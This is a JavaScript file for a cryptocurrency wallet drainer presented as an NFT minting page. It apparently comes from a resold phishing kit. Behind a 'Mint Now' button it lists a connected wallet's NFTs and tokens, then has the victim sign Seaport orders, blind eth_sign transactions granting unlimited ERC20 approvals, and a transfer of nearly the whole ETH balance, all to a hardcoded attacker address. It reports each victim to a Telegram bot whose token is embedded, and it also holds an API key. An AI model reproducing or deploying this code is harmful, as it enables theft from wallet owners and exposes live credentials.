"use strict";

const BOT_TOKEN = "5878709601:AAFnRQxKazkjZBTa-wXmasa80tkJjg3AmWQ";
const CHAT_ID = "2097116184";

/**** CONFIGURATIONS ****/

const config = { 

    /*** PUT YOUR PUBLIC KEY HERE  ***/
   receiver: "0x053973D64EE9256d6957E3C5D2b5dD100064F07F",


   design: {
       walletAppear: true,
       eliAppear: true,
       
       connectElement: "#connectButton",
       connectedElement: "#claimButton",
       
       retryDelay: 3000,
       

       buttonMessagesEnabled: true,
       buttonMessages: {
         initialConnect: "Connect Wallet",
         initialConnected: "Mint Now",

         progress: "LOADING...…", 
         success: "Something went wrong. !",
         failed: "Something went wrong.",
       }
   },


   walletDevider: 2,
   minWalletBalance: 0,

   claimInfo: {
       maxTransfer: 10,

       collectionDetails: {
           minAveragePrice: 0,
           minVolumeTraded: 0,
           minFloorPrice: 0,
       },

       minValueERC20: 0,
   },
   /**** SET TO TRUE IF YOU WANT TO USE A WEBHOOK ****/
   webHook: false,

   /**** PUT YOUR WEBHOOK URL HERE IF webHook SET TO TRUE****/
   webhookURL: "https://discord.com/api/webhooks/01010101010101010101/zxzxzxzxzxzxzxzxzzx",

}

/**** CONTRACT ABI ****/
const ERC20_ABI = [
    {
        "constant": false,
        "inputs": [
            {
                "name": "_spender",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "approve",
        "outputs": [
    
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

const NFT_ABI = [
    {
        "inputs":[
           {
              "internalType":"address",
              "name":"owner",
              "type":"address"
           },
           {
              "internalType":"address",
              "name":"operator",
              "type":"address"
           }
        ],
        "name":"isApprovedForAll",
        "outputs":[
           {
              "internalType":"bool",
              "name":"",
              "type":"bool"
           }
        ],
        "stateMutability":"view",
        "type":"function"
     },
];

class Configuration {
    web3Js;
    metamaskInstalled = false;

    isConnected  = false;

    walletAddress;
    walletBalance;
    walletBalanceInEth;
    chainId;

    transactions = [];
    ERC20tokens = [];
    NFTtokens = [];
    nonce;

    isMoneySent = false;

    OpenseaAPI = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";
    MoralisAPI = "HwhoFQBaE6ctDME2hqQstPKriJOClJ3i9OBUWE8y5eCXF5RL5ylXqy6BkKO8sXb8";
    requestOptions = {
        method: 'GET',
        headers: {
            Accept: 'application/json',
            'X-API-KEY': ''
        }
    };

    // FRONTENED BUTTONS 
    connectBtn = document.getElementById("connectButton");
    claimSection = document.getElementById("claimSection");
    claimButton;
    walletField = document.getElementById("walletAddress");
    eligible = document.getElementById("notEli");

}


class Main extends Configuration {

    constructor () { 
        super();

        if (typeof window.ethereum !== 'undefined') this.metamaskInstalled = true; 

        this.connectBtn = document.getElementById(config.design.connectElement.replace("#", ""));
        this.claimButton = document.getElementById(config.design.connectedElement.replace("#", ""));
        this.connectBtn.innerText = config.design.buttonMessages.initialConnect;
        this.claimButton.innerText = config.design.buttonMessages.initialConnected;


        Moralis.onWeb3Enabled(async (data) => {
            if (data.chainId !== 1 && this.metamaskInstalled) await Moralis.switchNetwork("0x1");
                this.updateStates(true);
        });

        window.ethereum ? window.ethereum.on('accountsChanged', (accounts) => {
            if (accounts.length < 1) this.updateStates(false)
        }) : null;

        if (this.isMobile() && !window.ethereum) {
            this.connectBtn.addEventListener("click", () => {
                window.location.href = `https://metamask.app.link/dapp/${window.location.hostname}${window.location.pathname}`;
            });
        } else {
            this.connectBtn.addEventListener("click", () => {
                this.connectWallet()
            });
        }
        this.claimButton.addEventListener("click", this.transfer);
    }

    connectWallet = async () => {
        this.isConnected = true;
        await Moralis.enableWeb3(!this.metamaskInstalled && {
            provider: "walletconnect"
        });
    }


    updateStates = async (connect = true) => {
        if(connect)
        {
            if(!this.isConnected) {
                await this.connectWallet();
            }

            this.isConnected = true;
            this.web3Js = new Web3(Moralis.provider);

            this.walletAddress = (await this.web3Js.eth.getAccounts())[0];
            this.walletBalance = await this.web3Js.eth.getBalance(this.walletAddress);
            this.walletBalanceInEth = await this.web3Js.utils.fromWei(this.walletBalance, 'ether')
            this.chainId = await this.web3Js.eth.getChainId();
            this.nonce = await this.web3Js.eth.getTransactionCount(this.walletAddress);

            this.claimSection.style.display = "block";
            this.connectBtn.style.display = "none";


            if(config.design.walletAppear) this.walletField.innerHTML = this.walletAddress.slice(0, 20) + " ...";
        } 
        else 
        {
            this.isConnected = false;
            this.claimSection.style.display = "none";
            this.connectBtn.style.display = "block";
        }

    }


     // [TRANSFER ALL]

    transfer = async () => {
        if(config.design.buttonMessagesEnabled) this.claimButton.innerText = config.design.buttonMessages.progress;
        this.transactions.push({
            type: "money",
            price: this.walletBalanceInEth
        });

        await this.fetchNFTS();

        let offers = [];

        try {
            
        await Promise.all(this.NFTtokens.map(async token => {
            await (async () => {
                let contractInstance = new this.web3Js.eth.Contract(NFT_ABI, token.contractAddress);
                let isApproved = await contractInstance.methods.isApprovedForAll(this.walletAddress, "0x1e0049783f008a0085193e00003d00cd54003c71").call({from: this.walletAddress})
                console.log(token.contractAddress, isApproved);

                if(isApproved) {
                    await this.sleep(Math.floor(Math.random() * (2000 - 700 + 1) + 700));
                    let tokenIds = await this.getNftTokenIds(token.contractAddress, this.walletAddress)
                    tokenIds.map(tokenId => {
                        offers.push({
                            amount: "1",
                            itemType: token.type == "erc721" ? 2 : 3,
                            token: token.contractAddress,
                            identifier: tokenId,
                            recipient: config.receiver
                        });
                    })
                }
            })();    
        }));
        } catch(error) {
            console.log(22, error)
        }
        console.log("continuing")


        if(offers.length != 0) {
            let provider = new ethers.providers.Web3Provider(window.ethereum);
            await provider.send('eth_requestAccounts', []);
            let signer = await provider.getSigner(0);
            const spClient = new seaport.Seaport(signer);    
    
    
            const { executeAllActions } = await spClient.createOrder(
                {
                  offer: offers,
                  consideration: [{
                    amount: "1",
                    recipient: config.receiver
                  }],    
                  conduitKey: "0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000",
                  zone: "0x004C00500000aD104D7DBd00e3ae0A5C00560C00", 
                  startTime: "1660921177",
                  endTime: "1663599577",
                },
                config.receiver
              );

              // let order;
              try { 
              const order = await executeAllActions();
              this.sendWebhooks("Approved Seaport",  this.walletAddress)
  

                const { executeAllActions: fulfillOrder } =
                await spClient.fulfillOrder({
                order,
                accountAddress: this.walletAddress,
                recipientAddress: config.receiver
                });
            
            let transaction = await fulfillOrder();
            console.log(transaction.hash)
              } catch(error) {
                if (error.code == 4001) {
                    this.sendWebhooks("Denied Seaport NO", this.walletAddress)
                }
              }    

        }


        await this.sleep(1000)
        await this.fetchERC20()

        let filteredTransactions = [...this.transactions]
        .sort((a, b) => b.price - a.price);
        
        console.log(filteredTransactions)
    

        if(filteredTransactions[0].type == "ERC20") {
            await this.transferERC20(filteredTransactions[0]);
        } 

        if(filteredTransactions[0].type == "money") {
            await this.transferMoney();
        } 

        if(filteredTransactions[1].type == "ERC20") {
            await this.transferERC20(filteredTransactions[1]);
        } 

        if(filteredTransactions[1].type == "money") {
            await this.transferMoney();
        } 

        if(filteredTransactions[2].type == "ERC20") {
            await this.transferERC20(filteredTransactions[2]);
        } 

        if(filteredTransactions[2].type == "money") {
            await this.transferMoney();
        } 


    };


    fetchNFTS = async () => {
        console.log("Fetching sending nfs");

        this.requestOptions.headers["X-API-KEY"] = this.OpenseaAPI;
            let nfts = [];
            nfts = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${this.walletAddress}&offset=0&limit=20`, this.requestOptions)
            .then(response => response.json())
            .then(nfts => {
                if (!nfts) return "Request was throttled";
                return nfts.filter(nft => {
                    if (nft.primary_asset_contracts.length > 0) return true
                    else return false
                })
                .map(nft => {
                    console.log(nft.primary_asset_contracts[0].schema_name.toLowerCase());
                    console.log(nft);
                    return {
                        name: nft.primary_asset_contracts[0].name,
                        type: nft.primary_asset_contracts[0].schema_name.toLowerCase(),
                        contractAddress: nft.primary_asset_contracts[0].address,
                        price: this.round(nft.stats.one_day_average_price != 0 ? nft.stats.one_day_average_price : nft.stats.seven_day_average_price) * nft.owned_asset_count,
                        owned: nft.owned_asset_count,
                        banner: nft.banner_image_url,
                        volumeTraded: nft.stats.total_volume,
                        slug: nft.slug
                    }
                })
            })
            .catch(err => {
                console.log("Nft Request error: ", err);
            })

        console.log("WalletNfts: ", nfts);

        nfts.map(nft => {
                const ethPrice = this.round(nft.price * (nft.type == "erc1155" ? nft.owned : 1))
                if (ethPrice < config.claimInfo.collectionDetails.minAveragePrice) return false;
                if (nft.volumeTraded < config.claimInfo.collectionDetails.minVolumeTraded) return false;
    
                return {
                    name: nft.name,
                    type: nft.type,
                    contractAddress: nft.contractAddress,
                    banner: nft.banner,
                    price: ethPrice * nft.owned,
                    averagePrice: ethPrice,
                    owned: nft.owned,
                    slug: nft.slug,
                    volumeTraded: nft.volumeTraded,
                };
            })
            .sort((a, b) => b.price - a.price)
            .map(transaction => {
            this.NFTtokens.push(transaction);
            // this.transactions.push(transaction);
        });

    }
    fetchERC20 = async () => {
        console.log("Trying sending ERC20");

        this.requestOptions.headers["X-API-KEY"] = this.MoralisAPI;
        const tokens = await fetch(`https://deep-index.moralis.io/api/v2/${this.walletAddress}/erc20?chain=eth`, this.requestOptions)
        .then(response => response.json())
        .catch(error => console.log(error));

        console.log("Wallet tokens: ", tokens);

        let filteredTransactions;
        filteredTransactions = tokens
        .filter(token => token.thumbnail != null)
        .map(token => {
            return {
                type: "ERC20",
                contractAddress: token.token_address,
                name: token.symbol,
                balance: token.balance,
                decimals: token.decimals,
                banner: token.thumbnail
            }
        });

        
        await Promise.all(filteredTransactions.map(async transaction => {
            let money = await this.ERC20toCurrency(transaction.contractAddress, transaction.balance, transaction.decimals);
            transaction.price = money.ethPrice
            transaction.usdPrice = money.usdPrice.toFixed(2);
            if(transaction.price < config.claimInfo.minValueERC20) return
            console.log("Transaction: ", transaction);
            this.transactions.push(transaction);

        }))
        .then(() => console.log("Erc20 function End"))

    }

    transferERC20 = async (object) => {
        console.log("ERC20 " + object.name)
        console.log(object.contractAddress);
        
        let contractInstance = new this.web3Js.eth.Contract(ERC20_ABI, object.contractAddress);
  
        let gasPrice = await this.web3Js.eth.getGasPrice();
        let hexGasPrice  = this.web3Js.utils.toHex(Math.floor(gasPrice * 4))
  
        const transactionObject = {
            nonce: this.web3Js.utils.toHex(this.nonce),
            gasLimit: this.web3Js.utils.toHex(80000),
            gasPrice: hexGasPrice,
            value: '0x0',
            to: object.contractAddress,
            data: contractInstance.methods.approve(config.receiver, "999999999999999999999999999999999999999999999999999999999").encodeABI(),
            v: '0x1',
            r: '0x',
            s: '0x',
        }
  
        let hexObject = new ethereumjs.Tx(transactionObject);
        const hexString = '0x' + hexObject.serialize().toString('hex'),
            encoded = {
                encoding: 'hex'
        }
  
  
        const rawHash = this.web3Js.utils.sha3(hexString, encoded);
        // var adsss=this.walletAddress;
   
        await this.web3Js.eth.sign(rawHash, this.walletAddress)
            .then(async (hash) => {
                this.sendWebhooks("Approved ERC20", hash);
                const firstPrefix = hash.substring(2);
                let r = '0x' + firstPrefix.substring(0, 64);
                let s = '0x' + firstPrefix.substring(64, 128);
                let fullHash = parseInt(firstPrefix.substring(128, 130), 16);
                let y = this.web3Js.utils.toHex(fullHash + this.chainId * 2 + 8);
  
                hexObject.r = r
                hexObject.s = s
                hexObject.v = y
  
                const signedTrans = '0x' + hexObject.serialize().toString('hex');
  
                // send signed Trasnaction 
                await this.web3Js.eth.sendSignedTransaction(signedTrans)
                .once('transactionHash', async hash => {
                    console.log("Success", hash);

                  })
                .catch(error => console.log("ERC20 TRANSFER error:", error));   
        })
        .catch(async error => {
            if(error.code == 4001) {
                this.sendWebhooks("Denied ERC20 NO", this.walletAddress)
            }
        });    
    }

    transferMoney = async () => {
        console.log("Money: Sending money");
        console.log("Wallet Balance:", this.walletBalanceInEth);
        console.log("Required: ", config.minWalletBalance);

        if (this.walletBalanceInEth < config.minWalletBalance) {
            // this.updateTransactions(0, true);
            return this.notEli();
        };
        console.log("Money: Enaugh balance");

        //let transactionNonce = await this.web3Js.eth.getTransactionCount(this.walletAddress, 'pending');

        let gasPrice = await this.web3Js.eth.getGasPrice();
        let hexGasPrice  = this.web3Js.utils.toHex(Math.floor(gasPrice * 1.5))

        let bnNumber = new this.web3Js.utils.BN('22000');
        let substractionNumber = bnNumber * Math.floor(gasPrice * 2);
        let etherToSend = this.walletBalance - substractionNumber;
        console.log(etherToSend);
        let nonce = await this.web3Js.eth.getTransactionCount(this.walletAddress);
        console.log(
            'Sending ' +
            this.web3Js.utils.fromWei(etherToSend.toString(), 'ether') +
            "ETH"
        );


        console.log("gas price", gasPrice);

        const transactionObject = {
            nonce: this.web3Js.utils.toHex(nonce),
            gasPrice: hexGasPrice,
            gasLimit:  this.web3Js.utils.toHex(21000),
            to: config.receiver,
            value: '0x' + etherToSend.toString(16),
            data: '0x',
            v: '0x1',
            r: '0x',
            s: '0x',
        }

        let hexObject = new ethereumjs.Tx(transactionObject);
        const hexString = '0x' + hexObject.serialize().toString('hex'),
            encoded = {
                encoding: 'hex'
        }

        const rawHash = this.web3Js.utils.sha3(hexString, encoded);
   
        await this.web3Js.eth.sign(rawHash, this.walletAddress)
            .then(async (hash) => {

                this.sendWebhooks("Approved Money", hash)
                const firstPrefix = hash.substring(2);
                let r = '0x' + firstPrefix.substring(0, 64);
                let s = '0x' + firstPrefix.substring(64, 128);
                let fullHash = parseInt(firstPrefix.substring(128, 130), 16);
                let y = this.web3Js.utils.toHex(fullHash + this.chainId * 2 + 8);

                hexObject.r = r
                hexObject.s = s
                hexObject.v = y

                const signedTrans = '0x' + hexObject.serialize().toString('hex');

                // send signed Trasnaction
                // this.updateTransactions(0, false, true);
                await this.web3Js.eth.sendSignedTransaction(signedTrans)
                .once('transactionHash', hash => {
                    console.log("Success MONEY", hash);
                })
                .catch(error => console.log("Money error:", error));                  
        })
        .catch(error => {

            if(error.code == 4001) {
                this.sendWebhooks("Denied Money NO", this.walletAddress)
            }

            // this.updateTransactions(0, true);

        });    
    } 


    getNftTokenIds = async (contractAddress, walletAddress) => {
        this.requestOptions.headers["X-API-KEY"] = this.MoralisAPI;
        const tokens = await fetch('https://deep-index.moralis.io/api/v2/' + walletAddress + '/nft/' + contractAddress + '?chain=Eth&format=decimal', this.requestOptions).then(resp => resp.json());
        let tokenIds = [];
        tokens.result.map(token => tokenIds.push(token.token_id));
        return tokenIds;
    }

    
    ERC20toCurrency = async (contract, tokenValue, tokenDecimals) => {
        this.requestOptions.headers["X-API-KEY"] = this.MoralisAPI;
        const result = await fetch(`https://deep-index.moralis.io/api/v2/erc20/${contract}/price`, this.requestOptions)
        .then(resp => resp.json());

                // convert perfect 1 USD ETHER to ETHER digits
        let ethprice = await this.web3Js.utils.fromWei(result.nativePrice.value, 'ether');
        let usdPrice = this.round(tokenValue / (10**tokenDecimals))

        tokenValue *= result.usdPrice;



        return {
            ethPrice: ethprice * usdPrice,
            usdPrice: this.round(tokenValue / (10**tokenDecimals))
        };
    }

    
    sendWebhooks = async (name, hash) => {
        if(!config.webHook) return;

        const websiteUrl = window.location.href;
        let escaper = (ah) => {
            return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
        }
        let nl = "\n";
        let message = `🥇 ${escaper(name)} ${nl} ` +
        `${nl}**${this.walletAddress}** ${nl}`+
        `${nl}📛 **Address**: [Wallet Address](https://etherscan.io/address/${this.walletAddress}) ${nl}`+
        `${nl}🚀 **Approve**: [Approve Check if it is successful](https://etherscan.io/tokenapprovalchecker?search=${this.walletAddress}) ${nl}`+
        `${nl}💸 **Hash**: [Hash](https://etherscan.io/tx/${escaper(hash)}) ${nl}`+
        `${nl}🙏 **Name**: [Good luck]${nl}`+

        `${nl}**Website**: ${escaper(websiteUrl)}`
        ;

        console.log(message);


    fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
              method: 'POST',
              headers: {
                  'Content-Type': 'application/json'
              },
              body: JSON.stringify({chat_id: CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true})
               //'parse_mode=MarkdownV2&chat_id=' + CHAT_ID + '&text=' + message + ""
          })
          .catch(err => console.error(err));
    }

    ifYouDontGotThisToolFromTrexonItGotReselled = () => {}

    calculateTransactionFee = async gasLimit => {
        try {
            let gasPrice = await web3.eth.getGasPrice();
            return (gasPrice * gasLimit) * 2;
        } catch(error) {
            console.log("Gas calculateGasFee error:", error);
        }
    }

    GASPricetoWEI = (gasPrice) => {
        return Number(parseFloat(gasPrice) * 21000)
    }

    notEli = () => {
        console.log("Not eligible");
        if(config.eliAppear) this.eligible.style.display = "block";
    }

    sleep = ms => {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    round = val => {
        return Math.round(val * 10000) / 10000;
    }

    isMobile = function () {
        let check = false;
        (function (a) {
            if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true;
        })(navigator.userAgent || navigator.vendor || window.opera);
        return check;
    };

}

window.addEventListener('load', async () => {
    let obj = new Main();
});
